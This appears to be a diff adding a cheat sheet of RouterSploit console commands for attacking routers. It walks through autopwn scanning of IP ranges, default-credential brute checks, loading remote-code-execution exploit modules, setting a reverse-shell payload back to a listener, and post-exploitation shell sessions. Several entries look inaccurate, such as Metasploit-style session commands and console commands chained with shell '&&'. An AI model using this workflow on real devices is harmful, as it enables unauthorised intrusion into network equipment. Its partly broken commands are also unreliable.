@@ -1,0 +1,169 @@
+[X] RouterSploit Framework Command List (CLI Only)
+
+[\] routersploit
+[/] Start RouterSploit interactive console
+
+[\] rsf.py
+[/] Launch RouterSploit framework (alternative entry point)
+
+[\] python3 rsf.py
+[/] Run RouterSploit using Python interpreter
+
+# -------------------------
+# HELP / BASICS
+# -------------------------
+
+[\] help
+[/] Show available commands in RouterSploit console
+
+[\] show exploits
+[/] List all available exploit modules
+
+[\] show scanners
+[/] List all scanner modules
+
+[\] show creds
+[/] Show stored credentials
+
+[\] show payloads
+[/] List available payload modules
+
+# -------------------------
+# TARGET SETUP
+# -------------------------
+
+[\] use scanners/autopwn
+[/] Select autopwn scanner module
+
+[\] set target 192.168.1.1
+[/] Define router target IP address
+
+[\] set target 192.168.0.1-192.168.0.255
+[/] Scan IP range
+
+[\] set threads 10
+[/] Set scan/exploit thread count
+
+# -------------------------
+# SCANNING
+# -------------------------
+
+[\] run
+[/] Execute selected scanner module
+
+[\] use scanners/routers/router_scan
+[/] Scan router vulnerabilities
+
+[\] use scanners/creds/default_creds
+[/] Check for default credentials
+
+[\] set port 80
+[/] Define target web interface port
+
+[\] set ssl true
+[/] Enable HTTPS scanning
+
+[\] run
+[/] Start scanning process
+
+# -------------------------
+# EXPLOITATION
+# -------------------------
+
+[\] use exploits/routers/netgear_auth_bypass
+[/] Load Netgear router exploit module (example)
+
+[\] use exploits/routers/dlink_rce
+[/] Load D-Link remote code execution module (example)
+
+[\] set target 192.168.1.1
+[/] Set exploit target
+
+[\] set username admin
+[/] Set username parameter (if required)
+
+[\] set password admin
+[/] Set password parameter (if required)
+
+[\] set cmd "reboot"
+[/] Set command to execute (if supported)
+
+[\] run
+[/] Execute exploit
+
+# -------------------------
+# PAYLOADS
+# -------------------------
+
+[\] use payloads/cmd/unix/reverse_tcp
+[/] Select reverse shell payload (Unix)
+
+[\] set lhost 192.168.1.100
+[/] Set local listener IP
+
+[\] set lport 4444
+[/] Set local listener port
+
+[\] generate
+[/] Generate payload
+
+# -------------------------
+# POST-EXPLOITATION
+# -------------------------
+
+[\] show sessions
+[/] Display active sessions
+
+[\] sessions -i 1
+[/] Interact with session ID 1
+
+[\] shell
+[/] Open remote shell (if exploit succeeds)
+
+[\] sysinfo
+[/] Get system/router information
+
+# -------------------------
+# DEFAULT CREDENTIAL ATTACKS
+# -------------------------
+
+[\] use scanners/creds/default_creds
+[/] Check common router passwords
+
+[\] set target 192.168.1.1
+[/] Set router target
+
+[\] run
+[/] Start credential brute-check
+
+# -------------------------
+# MODULE MANAGEMENT
+# -------------------------
+
+[\] search router
+[/] Search available router-related modules
+
+[\] use <module_name>
+[/] Load specific exploit/scanner/payload module
+
+[\] back
+[/] Return to previous menu
+
+[\] exit
+[/] Exit RouterSploit framework
+
+# -------------------------
+# PIPELINE EXAMPLES
+# -------------------------
+
+[\] python3 rsf.py && use scanners/autopwn
+[/] Start framework and run autopwn scanner
+
+[\] set target 192.168.1.1 && run
+[/] Scan or exploit configured target
+
+[\] use scanners/creds/default_creds && set target 192.168.1.1 && run
+[/] Check router for default credentials
+
+[\] use exploits/routers/* && set target 192.168.1.1 && run
+[/] Attempt router exploitation workflow
